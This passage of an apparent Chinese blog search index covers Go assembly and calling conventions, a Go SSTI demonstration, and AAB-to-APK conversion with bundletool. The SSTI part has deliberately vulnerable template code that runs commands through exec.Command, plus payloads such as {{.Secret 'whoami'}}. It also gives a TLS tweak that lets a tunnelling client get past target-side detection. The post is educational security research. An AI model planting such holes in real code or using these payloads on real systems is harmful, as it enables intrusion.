pointer）：静态基址指针寄存器，一般用在声明函数、全局变量中 打印汇编代码 对于Go语言，生成汇编代码的常用命令有以下几种：\n1 2 3 4 5 6 7 8 9 10 11 12 go tool compile -S test.go \u0026gt; test.s #重定向输出 go tool compile -S -N test.go # -N禁止优化 gccgo -S -O0 -masm=intel test.go #生成empty.s文件，-O0/1/2/3指定优化 go build -gcflags \u0026#34;-N -l\u0026#34; test.go #生成可执行程序 go tool objdump executable # 使用内置工具打印可执行程序的汇编代码 objdump -d executable \u0026gt; disassembly #对于x86/amd64架构的汇编 go build -gcflags=\u0026#34;-N -l -S\u0026#34; test.go #直接输出汇编 上述中的go tool compile命令用于将Go源文件汇编化，常使用的命令参数：\n-N：禁止优化 -l：禁止内联 -S：打印出汇编代码 -m：打印变量内存逃逸信息 1 2 go tool compile -N -l -S main.go #打印main.go文件对应汇编代码 GOOS=linux GOARCH=amd64 go tool compile -N -l -S main.go #打印针对特定系统和CPU架构的汇编代码 下图所示中，\u0026quot;\u0026quot;.EmptyFunc(SB)表示了一个函数的起始点，指明了函数EmptyFunc的起始地址，也就是函数的标签。这个标签是由函数的名称（EmptyFunc）和SB（Static Base）组成的：\nEmptyFunc：这是函数的名称。 SB：Static Base的缩写，表示这是一个静态基址。在Go的汇编中，SB表示的是全局静态数据的起始地址。 ABIInternal 表示函数使用 Go 内部的 ABI（Application Binary Interface），而不是与操作系统的 ABI 交互。(Go函数的调用约定和数据布局是根据 Go 的规范定义的，而不是根据底层操作系统的规范)。\n$0-0 表示该函数没有参数和返回值。第一个数字（0）表示传入参数的大小，第二个数字（0）表示返回值的大小。因为函数没有参数或返回值，所以它们的大小都是零。\n汇编代码主要分为两个部分，第一个部分是EmptyFunc()函数，第二个部分是main()函数：\nEmptyFunc()函数汇编代码：包含一条RET指令，意味着函数调用结束后会直接返回。 main()函数： 首先是栈检查部分：访问线程本地存储（TLS）并进行栈边界检查。 MOVQ (TLS), CX：这条指令将线程本地存储中的值加载到 CX 寄存器中。TLS 包含线程特定的数据，因此这个指令用于访问当前线程的 TLS 区域。 CMPQ SP, 16(CX)：这条指令将栈指针 SP 和 CX 寄存器中的值进行比较，其中 CX 中的值通常是 TLS 区域的起始地址。在这里，16(CX) 是相对于 CX 寄存器的偏移量，用于访问 TLS 区域中的某个特定值，这个值通常是栈的边界。通过将栈指针与 TLS 区域中的栈边界进行比较，可以进行栈边界检查，以确保栈的使用不会超出 TLS 区域的范围。 JLS指令用于判断栈是否不足，如果是则跳转到46行。 如果栈空间足够，执行下面的指令： 使用SUBQ指令减少栈的大小，为局部变量预留空间。 将当前BP寄存器的值保存到栈上。 使用LEAQ指令更新BP寄存器的值，指向新的栈帧。 调用EmptyFunc函数：使用CALL指令调用EmptyFunc函数。 返回和栈恢复： 将栈上保存的BP寄存器的值恢复到BP寄存器中。 通过ADDQ指令恢复栈的大小。 RET指令用于函数返回。 在栈空间不足时，调用runtime.morestack_noctxt函数扩展栈，并通过JMP指令重新执行main函数。 而go tool objdump命令将目标文件或二进制文件反编译出汇编，常用的命令参数：\n-S：打印汇编代码\n-s：根据指定的正则，打印相关的汇编代码\n1 2 3 go tool compile -N -l funcconst.go # 生成funcconst.o go tool objdump funcconst.o # 打印汇编代码 go tool objdump -s \u0026#34;main.(main|FuncConst)\u0026#34; funcconst # objdump打印特定汇编代码 使用objdump打印目标定函数的汇编代码：\n优化 为保证程序执行的高效性和安全性，Go编译器默认会做内联优化、删除无效代码等操作，可以在不引入额外的代码复杂性的情况下，显著提高程序的性能，并在某些情况下产生非常明显的性能改进。但在分析场景中，常所需要的是未做优化编译生成的二进制，否则反编译二进制程序出的汇编代码会有差异。\n1 2 3 4 5 6 7 #编译器自动优化 go build -o empty_optimize empty.go go tool objdump empty_optimize #禁止编译器优化 go build -gcflags \u0026#34;-N -l\u0026#34; -o empty_no_optimize empty.go #禁止内联优化 go tool objdump empty_no_optimize 下图就是一个编译优化的对比图，很清楚可以看到优化后的汇编代码简洁很多：\n函数 在Go中，函数“一等公民”类型，可以把函数当作值来使用。 一个函数类型的字面表示形式由一个func关键字和一个函数签名字面表示表示形式组成，一个函数签名由一个输入参数类型列表和一个输出结果类型列表组成。\n调用栈 栈是一种数据结构，从高地址到低地址扩展，栈的作用就是保存函数局部变量、调用函数时传递参数、保存函数返回地址。栈是以先进后出的原则进行存取数据。\n栈帧是一种技术手段，通常是使用EBP（栈帧指针）寄存器访问栈内局部变量、参数、函数返回地址等的手段。\n下图是 internal architecture of delve 文章中的一个调用栈图：\n程序执行的时候，分配了栈的空间。通过调用runtime.main开始启动Goroutine，实线部分表示已经使用了的内存空间，虚线的表示为后续使用的内存空间 runtime.main通过将返回地址压栈来调用main.main main.main将它的局部变量压入栈中 当main.main调用其他函数时，比如叫main.f函数，做了两步：一是将main.f函数的参数压栈；二是将返回地址压栈 最后main.f将它的局部变量压栈 如果在一个函数中调用另一个函数，编译器就会对应生成一条call指令，程序执行到这条指令时，就会跳转到被调用函数入口地址处开始执行；而每个函数汇编指令最后都有一条ret指令，负责在函数调用完成后回到调用处继续执行。\n调用约定 Go语言的调用约定主要由目标操作系统的ABI（Application Binary Interface）规范决定。在大多数情况下，Go语言使用的调用约定与目标操作系统的默认ABI相匹配，主要目的是确保不同模块之间的函数调用可以正确地进行参数传递、返回值获取，并且能够与目标操作系统的ABI规范相匹配，以便正确地与操作系统原生代码和库进行交互。\n一般地，Go语言的调用约定包括以下几个方面：\n参数传递方式： 参数的传递方式包括寄存器传递和栈传递。在调用约定中，规定了哪些参数使用寄存器传递，哪些使用栈传递。通常情况下，一些简单的数据类型和参数数量较少的函数会使用寄存器传递，而复杂的数据类型和参数较多的函数会使用栈传递。 返回值传递方式： 返回值的传递方式也与参数类似，可以通过寄存器传递，也可以通过栈传递。对于多返回值的情况，可能会使用寄存器传递多个返回值。 调用者/被调用者保存寄存器： 调用约定规定了哪些寄存器由调用者负责保存和恢复，哪些寄存器由被调用者负责保存和恢复。一般而言，一些通用寄存器由调用者保存和恢复，而一些特定的寄存器可能由被调用者保存和恢复。 栈帧布局： 调用约定还规定了函数栈帧的布局，包括局部变量、参数、返回地址等在栈上的布局方式。 异常处理： 调用约定可能还包括了异常处理机制，如何在函数调用过程中处理异常情况。 参数和返回值 在测试环境为go version go1.16.10 linux/amd64的平台中，创建一个简单函数调用的代码，并使用go build -gcflags \u0026quot;-N -l\u0026quot; -o empty_no_optimize empty.go：\n1 2 3 4 5 6 7 8 package main func EmptyFunc() {} func main() { EmptyFunc() } 对生成的二进制程序empty_no_optimize进行go tool objdump empty_no_optimize操作，得到EmptyFunc和main函数的汇编代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 TEXT main.EmptyFunc(SB) /home/kali/Desktop/demo/empty.go empty.go:3 0x45ec60 c3 RET TEXT main.main(SB) /home/kali/Desktop/demo/empty.go empty.go:5 0x45ec80 64488b0c25f8ffffff MOVQ FS:0xfffffff8, CX empty.go:5 0x45ec89 483b6110 CMPQ 0x10(CX), SP empty.go:5 0x45ec8d 761f JBE 0x45ecae empty.go:5 0x45ec8f 4883ec08 SUBQ $0x8, SP empty.go:5 0x45ec93 48892c24 MOVQ BP, 0(SP) empty.go:5 0x45ec97 488d2c24 LEAQ 0(SP), BP empty.go:7 0x45ec9b 0f1f440000 NOPL 0(AX)(AX*1) empty.go:7 0x45eca0 e8bbffffff CALL main.EmptyFunc(SB) empty.go:8 0x45eca5 488b2c24 MOVQ 0(SP), BP empty.go:8 0x45eca9 4883c408 ADDQ $0x8, SP empty.go:8 0x45ecad c3 RET empty.go:5 0x45ecae e8adafffff CALL runtime.morestack_noctxt(SB) empty.go:5 0x45ecb3 ebcb JMP main.main(SB) 将调用的函数加上返回值，创建函数为FuncConst并调用：\n1 2 3 4 5 6 7 8 9 package main func FuncConst() int { return 123 } func main() { FuncConst() } 使用go build -gcflags \u0026quot;-N -l\u0026quot; -o funcconst funcconst.go 编译二进制程序后，go tool objdump -S funcconst查看汇编代码：\n比较有无返回值时候，生成的汇编代码差异：\n左右两边的汇编代码有差异性，但是不太大，左边的FuncConst()函数汇编代码多了:\n1 2 0x45ec60 48c744240800000000 MOVQ $0x0, 0x8(SP) 0x45ec69 48c74424087b000000 MOVQ $0x7b, 0x8(SP) 从多出的汇编指令可以看出，Go1.16的返回值是通过内存空间中的栈传递的，并非像x86-64的调用约定那样使用寄存器传值。\n那Golang是如何传输简单的参数的，如整形数据？\n1 2 3 4 5 6 7 8 9 10 package main func FuncAdd(x, y, z int) int { return x + y - z } func main() { FuncAdd(1,2, 3) } 可以看出Go1.16的参数是通过栈进行传递，而不是用寄存器传递。\n寄存器传值 Go1.17版本开始使用寄存器来代替栈，用于传递函数的参数和返回值。\n将下列示例代码在go1.17.3 linux/amd64的环境下编译，并使用./go1.17.3 tool objdump funcadd命令打印汇编代码， 发现FuncAdd()函数使用AX、BX、CX寄存器传递：\n1 2 3 4 5 6 7 8 9 10 package main func FuncAdd(x, y, z int) int { return x + y - z } func main() { FuncAdd(1, 2, 3) } 继续使用新的样例代码,查看不同的Go版本（Go1.16和Go1.17）的汇编代码(go tool compile -S -N -l add.go)：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 //add.go package main func addTwo(a, b int) int{ return a+b } func main(){ test := addTwo(2,3) print(test) } 下图的左边是Golang1.17版本，在调用addTwo()函数前，使用了寄存器AX和BX传参数值，而右边的Go1.16是使用的栈进行传参数值：\nhttps://go.dev/blog/go1.18beta1 指出Go1.17新加入了基于寄存器的调用约定，用于加速 x86-64 系统上的Go代码运行效率，Go1.18beta版本将这个特性扩展到了 AMR64 和 PPC64 上。\n那是不是Golang1.17就不通过栈传参，只通过寄存器传参呢？\n此时编写一个简单的加法函数代码——12个整型数相加，并使用go tool compile -S -N -l func_Add_many.go 将代码进行汇编代码转换:\n1 2 3 4 5 6 7 8 9 10 11 package main func main() { println(Add12(1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12)) } func Add12(a, b, c, d, e, f, g, h, i, j, k, l int) int{ return a + e + i + b + f + j + c + g + k + d + h + l } 可见上图中的Go1.16.10版本使用栈传参，而go1.17.3版本用了寄存器和栈传参。可见，在go1.17.3中，前9个参数依次使用AX、BX、CX、DI、SI、R8、R9、R10、R11这9个通用寄存器进行传递，其他的参数按顺序放在栈上。\n安全 SSTI Go语言内置了 text/template 和 html/template两个模板库，专门用于处理html模板。html/template 在 text/template 模板库的基础上增加了自动转义机制，对html输出的安全处理，从而防止恶意代码注入。\n基本使用\n创建两个文件，一个为hello.html，一个为main.go，使用模板包处理渲染HTML。html文件中使用了template的语法{{.}}，然后通过go的template引擎进行解析，替换成对应的内容——Hello World，所以浏览器渲染的是Hello World ：\n在template中，点.代表当前作用域的当前对象。 上述中，hello.html中的 {{.}}点是顶级作用域范围内的，代表Execute(w,\u0026quot;Hello World\u0026quot;)的第二个参数Hello World，即它代表这个字符串对象。\n如果修改代码，加入一个User结构体，执行t.Execute(w, \u0026amp;u1)：就会解析到u1 对象，即打印u1对象的所有值 {0 test@test.com test123}。如果html中的代码 {{ . }}修改为{{.Password}} 就会等同于执行了t.Execute(w, \u0026amp;u1.Password) ，浏览器上的HTML就会解析、渲染Password的值——test123 。如果如果html中的代码{{ . }}修改为{{.Pa}}：，那么就没有正确的值可以访问，浏览器上对应的地方就会出现空白，没有任何相关输出。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 package main import ( \u0026#34;html/template\u0026#34; \u0026#34;net/http\u0026#34; ) type User struct { ID int Email string Password string } func tmpl(w http.ResponseWriter, r *http.Request) { var u1 = \u0026amp;User{0, \u0026#34;test@test.com\u0026#34;, \u0026#34;test123\u0026#34;} t, err := template.ParseFiles(\u0026#34;hello.html\u0026#34;) if err != nil { panic(err) } t.Execute(w, \u0026amp;u1) } func main() { server := http.Server{ Addr: \u0026#34;:8080\u0026#34;, } http.HandleFunc(\u0026#34;/\u0026#34;, tmpl) server.ListenAndServe() } 用Golang的模版编写有SSTI缺陷的代码，不仅仅可以做到获取敏感信息，还可以实现RCE。下面代码就存在SSTI的缺陷：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 package main import ( \u0026#34;bufio\u0026#34; \u0026#34;html/template\u0026#34; \u0026#34;log\u0026#34; \u0026#34;os\u0026#34; \u0026#34;os/exec\u0026#34; ) type Person string func (p Person) Secret(test string) string { out, _ := exec.Command(test).CombinedOutput() return string(out) } func (p Person) Label(test string) string { return \u0026#34;This is \u0026#34; + string(test) } func main() { reader := bufio.NewReader(os.Stdin) text, _ := reader.ReadString(\u0026#39;\\n\u0026#39;) tmpl, err := template.New(\u0026#34;\u0026#34;).Parse(text) if err != nil { log.Fatalf(\u0026#34;Parse: %v\u0026#34;, err) } tmpl.Execute(os.Stdin, Person(\u0026#34;Golang SSTI\u0026#34;)) } 根据代码{{.}}、 {{.Label \u0026quot;GoGoGolang\u0026quot;}} 、 {{.Secret \u0026quot;whoami\u0026quot;}} 、{{\u0026quot;whoami\u0026quot; | .Secret}} 会调用Person结构体的方法，从而执行定义的方法：\n一般地，如果调用对象的方法本身不存在命令执行，那很大可能不会造成RCE，除非有其它的一些特殊函数执行。而上述POC代码中触发恶意行为的关键就是Secret()方法，本质上就是方法中调用了命令执行的代码：\n1 2 3 4 func (p Person) Secret(test string) string { out, _ := exec.Command(test).CombinedOutput() return string(out) } 其它 503 Service Unavailable 在写reGeorgGo的时候，使用vulhub上的一个靶机作为测试站点，遇到一个问题——Go编写的客户端程序发出的正常数据包请求测试站点，会返回\u0026quot;503 Service Unavailable\u0026quot;。且经过Python、Curl等多方向测试，均可访问，但唯独Go编写的客户端程序无法返回\u0026quot;200\u0026quot;的HTTP状态码。\n原因： 经多方查阅资料，发现有可能是以下原因导致：\n未做HTTP客户端的 TLS 版本 设置导致 和 Chiper Suite 有关系，Go 在 TLS 1.2 的 Chiper Suite 里加入了三个 TLS 1.3 专属的 Suite，分别是 TLS_AES_128_GCM_SHA256，TLS_CHACHA20_POLY1305_SHA256，TLS_AES_256_GCM_SHA384，Go HTTP Client 所使用的默认 TLS Cipher Suites，由于特征太过明显，被测试站点检测到，对Go Client 进行数据包的拦截。 https://go.dev/blog/tls-cipher-suites\n解决办法： 指定了其Transport字段，其中的TLSClientConfig字段设置了TLS配置，即可正常访问测试环境的站点：\n1 2 3 4 5 6 7 8 myClient := \u0026amp;http.Client{ Transport: \u0026amp;http.Transport{ TLSClientConfig: \u0026amp;tls.Config{ MaxVersion: tls.VersionTLS12, }, }, } request, err := http.NewRequest(\u0026#34;GET\u0026#34;, \u0026#34;https://www.xx/\u0026#34;, nil) References https://github.com/chai2010/go-ast-book https://tai-e.pascal-lab.net/ https://www.anquanke.com/post/id/215419 https://gfw.go101.org/article/function.html https://www.cnxct.com/why-golang-elf-binary-file-is-large-than-c/ http://www.blackstormsecurity.com/docs/BHACK_2021_ALEXANDREBORGES.pdf https://go.dev/blog/go1.18beta1 https://speakerdeck.com/aarzilli/internal-architecture-of-delve?slide=6 https://mp.weixin.qq.com/s/iFYkcLbNK5pOA37N7ToJ5Q https://go.cyub.vip/analysis-tools/go-buildin-tools.html#go-tool-compile https://stackoverflow.com/questions/23789951/easy-to-read-golang-assembly-output https://segmentfault.com/a/1190000039753236 https://dr-knz.net/go-calling-convention-x86-64.html https://mp.weixin.qq.com/s/mmB45mFfU0IHMEqyuQwIwQ https://www.mandiant.com/resources/blog/golang-internals-symbol-recovery https://www.bookstack.cn/read/qcrao-Go-Questions/map-%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E4%B8%A4%E7%A7%8D%20get%20%E6%93%8D%E4%BD%9C.md https://juejin.cn/post/6844903965541285896 https://sourcegraph.com/github.com/golang/go/-/blob/src/runtime/runtime2.go https://www.onsecurity.io/blog/go-ssti-method-research/ ","description":"","id":7,"section":"posts","tags":["Golang","go","sec","IDA","reverse"],"title":"Golang杂记","uri":"https://zz1gg.github.io/posts/talk-about-golang-informally/"},{"content":"aab文件转换为apk文件\n前言 在 2018 年的 Google I/O 大会上，Google 向 Android 引入了 Android App Bundle，缩写为 AAB：\n在2021年，Google宣布Google Play 将开始要求从 2021 年 8 月开始使用 Android App Bundle 发布新应用，这将取代 APK 作为标准发布格式。\nAPK APK: Android应用程序包（Android application package）是Android操作系统使用的一种应用程序包文件格式，用于分发和安装移动应用及中间件。一个Android应用程序的代码想要在Android设备上运行，必须先进行编译，然后被打包成为一个被Android系统所能识别的文件才可以被运行，而这种能被Android系统识别并运行的文件格式便是APK。\n可以使用Kotlin、Java 等多种语言编写Android应用程序，编译前项目的结构大概如图：\n典型 Android 应用模块的构建流程, 按照以下常规步骤执行：\n编译器将您的源代码转换成 DEX 文件（Dalvik 可执行文件，其中包括在 Android 设备上运行的字节码），并将其他所有内容转换成编译后的资源。\nAPK 打包器将 DEX 文件和编译后的资源组合成单个 APK。不过，必须先为 APK 签名，然后才能将应用安装并部署到 Android 设备上。\nAPK 打包器使用调试或发布密钥库为 APK 签名：\n如果您构建的是调试版应用（即专用于测试和分析的应用），则打包器会使用调试密钥库为应用签名。Android Studio 会自动使用调试密钥库配置新项目。\n如果您构建的是打算对外发布的发布版应用，则打包器会使用发布密钥库为应用签名。如需创建发布密钥库，请参阅在 Android Studio 中为应用签名。\n在生成最终 APK 之前，打包器会使用 zipalign 工具对应用进行优化，以减少其在设备上运行时所占用的内存。\n一个 APK 文件包含 Android 应用的所有内容，它也是 Android 设备用来安装应用的文件。APK 是遵循 ZIP 文件格式的文件，Android SDK 工具会将代码连同任何数据和资源文件编译成后缀为 .apk 的APK归档文件。使用Android Studio的APK Analyzer tool 分析样例helloworld.apk，可以看出该APK的归档文件概况：\nAPK 文件由一个 Zip 压缩文件组成，其中包含构成应用的所有文件。这些文件包括 Java 类文件、资源文件和包含已编译资源的文件。\n上述的 APK 包含以下目录：\nMETA-INF/：包含 CERT.SF 和 CERT.RSA 签名文件，以及 MANIFEST.MF 清单文件。 res/：包含未编译到 resources.arsc 中的资源。 resources.arsc：包含已编译的资源。此文件包含 res/values/ 文件夹的所有配置中的 XML 内容。打包工具会提取此 XML 内容，将其编译为二进制文件形式，并压缩内容。此内容包括语言字符串和样式，以及未直接包含在 resources.arsc 文件中的内容（例如布局文件和图片）的路径。 classes.dex：包含以 Dalvik/ART 虚拟机可理解的 DEX 文件格式编译的类。 AndroidManifest.xml：包含核心 Android 清单文件。此文件列出了应用的名称、版本、访问权限和引用的库文件。该文件使用 Android 的二进制 XML 格式。 而有的APK还会包含：\nlib/：包含特定处理器软件层的已编译代码。此目录包含每种平台类型的子目录，如 armeabi、armeabi-v7a、arm64-v8a、x86、x86_64 和 mips。 assets/：包含应用的资源；应用可以使用 AssetManager 对象检索这些资源。 而上述的文件目录，可看出一些APK的打包情况。如可以将平台兼容性、资源等文件打包进APK。\n往往，在单一APK打包文件时，为了兼容硬件规格、语言等，就会将兼容性的文件一同打包在同一个APK文件中。随着Android的发展，需要打包到APK中的东西越来越多。这种就会出现一个问题，就是很多文件是安装机器不需要下载、存储的。而且构建分APK上传到商店，也需要上传多份APK，不是一个好的版本控制方式。\n而AAB打包方式，减小APK大小，改变交付方式，很好的解决了这种臃肿的打包方式。\nAAB Android App Bundle为新 App 动态化框架（Android App Bundle，缩写为 AAB），即是一个动态的载体文件。AS生成的aab文件，可将语言、屏幕大小、硬件架构等内容全部覆盖。\n下图是Android App Bundle 格式图：\n使用AS生成aab文件，生成的aab文件为1.2MB，而APK文件大小为1.6MB：\n使用Android Studio的APK Analyzer tool 分析样例helloworld.aab，可以看出该APK的归档文件概况：\nBUNDLE-METADATA/：此目录包含元数据文件，其中包含对工具或应用商店有用的信息。此类元数据文件可能包含 ProGuard 映射和应用的 DEX 文件的完整列表。此目录中的文件未打包到您应用的 APK 中。 模块协议缓冲区 (*.pb) 文件：这些文件提供了一些元数据，有助于向各个应用商店（如 Google Play）说明每个应用模块的内容。例如， BundleConfig.pb 提供了有关 bundle 本身的信息（如用于构建 app bundle 的构建工具版本），native.pb 和 resources.pb 说明了每个模块中的代码和资源，这在 Google Play 针对不同的设备配置优化 APK 时非常有用。 manifest/：与 APK 不同，app bundle 将每个模块的 AndroidManifest.xml 文件存储在这个单独的目录中。 dex/：与 APK 不同，app bundle 将每个模块的 DEX 文件存储在这个单独的目录中。 res/、lib/ 和 assets/：这些目录与典型 APK 中的目录完全相同。当上传 App Bundle 时，Google Play 会检查这些目录并且仅打包满足目标设备配置需求的文件，同时保留文件路径。 root/：此目录存储的文件之后会重新定位到包含此目录所在模块的任意 APK 的根目录。 由此可见AAB的一些优势：\n体积轻盈：根据设备的不同属性，进行优化生成APK 应用模块化：开发者可将应用的功能拆分下来，允许用户自行下载 免下载体验：AAB 具有免安装分发特性，可让用户在 Google Play 里即可体验APP 格式转换 据谷歌官方文档描述“Android App Bundle 是您上传到 Google Play 的一种文件（文件扩展名为 .aab）”。 也就是说，AAB的转换，可以通过Google Play来帮助用户实现。而想要在本地测试aab转换后的apk，就可以通过bundletool 工具实现转换， Github下载地址为 https://github.com/google/bundletool/releases\nbundletool 是一种底层工具，可供 Gradle、Android Studio 和 Google Play 用于构建 Android App Bundle 或将 App Bundle 转换为部署到设备的各种 APK\n使用bundletool生成apks：\n1 java -jar bundletool-all-1.7.0.jar build-apks --bundle=app-debug.aab --output=helloworld.apks 生成的apks是一个压缩包，查看apks压缩包，主要由toc.pb文件、splits文件夹、standalones文件夹组成：\n使用密钥文件可以生成签名的APK文件：\n1 java -jar bundletool.jar build-apks --bundle=test.aab --output=test.apks --ks=keystore.jks --ks-pass=pass:your_keystore_password --ks-key-alias=your_key_alias --key-pass=pass:your_key_password 只提取一个APK：\n1 java -jar bundletool.jar build-apks --bundle=test.aab --output=nhl.apks --mode=universal 提取一个签名的通用APK文件：\n1 java -jar bundletool.jar build-apks --bundle=nhl.aab --output=test.apks --overwrite --mode=universal -ks=keystore.jks --ks-pass=pass:your_keystore_password --ks-key-alias=your_key_alias --key-pass=pass:your_key_password 安装apks到当前设备，运行成功：\n1 bundletool install-apks --apks=test.apks aab2apk 在某些测试场景中，需要对aab进行转换，且获取到aab文件的一些基本信息，编写了aab2apk小工具。\n在Windows上的使用，如下：\naab2apk.exe -e test.aab -o test.apk 在Mac上的使用，如下：\n./aab2apk_mac -e test.aab -o test.apk 在Ubuntu上的使用，如下：\n./aab2apk_linux -e test.aab -o test.apk References https://www.androidauthority.com/android-apks-sunset-1636829/ https://conorlee.top/2019/03/27/Android-APP-Bundles-Introduction/ https://developer.android.com/studio/build/index.html?hl=zh-cn#build-process https://zh.wikipedia.org/wiki/APK https://developer.android.com/topic/performance/reduce-apk-size?hl=zh-cn#apk-structure https://www.ifanr.com/1426594 https://developer.android.google.cn/guide/app-bundle/app-bundle-format?hl=zh-cn ","description":"","id":8,"section":"posts","tags":["Android","aab","apk"],"title":"AAB转换APK","uri":"https://zz1gg.github.io/posts/aabtoapk/"},{"content":"Hello World！！\n","description":"Hugo, the world’s fastest framework for building websites","id":9,"section":"","tags":null,"title":"About","uri":"https://zz1gg.github.io/about/"}]